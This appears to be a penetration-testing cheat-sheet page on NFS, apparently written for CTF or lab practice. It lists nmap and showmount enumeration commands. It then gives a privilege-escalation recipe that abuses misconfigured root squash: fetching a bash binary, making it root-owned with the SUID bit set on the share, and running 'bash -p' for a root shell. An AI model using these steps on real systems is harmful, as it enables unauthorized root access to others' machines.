# NFS

[Network File System](https://en.wikipedia.org/wiki/Network_File_System) is a distributed file system protocol originally developed by Sun Microsystems in 1984, allowing a user on a client computer to access files over a computer network much like local storage is accessed.

## Enumerate

```bash
# install nfs-common and run a nmap full scan

sudo nmap -sS -Pn -sV -sC -oN allports -p- -T5 -vv [IP]

# use nmap to enumerate

nmap -p [PORT] --script=nfs-ls,nfs-statfs,nfs-showmount [IP]

# list the shares

/usr/sbin/showmount -e [IP]

# create mountpoint

mkdir /tmp/mount

sudo mount -t nfs [IP]:share /tmp/mount/ -nolock
```
## Exploit
You can exploit NFS shares to escalate your privileges on your target.

1. NFS Access

2. Gain Low Privilege Shell

3. Upload Bash Executable to the NFS share

4. Set SUID Permissions Through NFS Due To Misconfigured Root Squash

5. Login through SSH

6. Execute SUID Bit Bash Executable

7. ROOT ACCESS
<br></br>
```bash
# on your host download bash binary matching the version on your target

wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash

sudo chown root bash

# copy the binary to the NFS share, cd into the NFS share, and set permissions

chmod +s bash
chmod +x bash

# ssh into the NFS share and run bash

./bash -p
```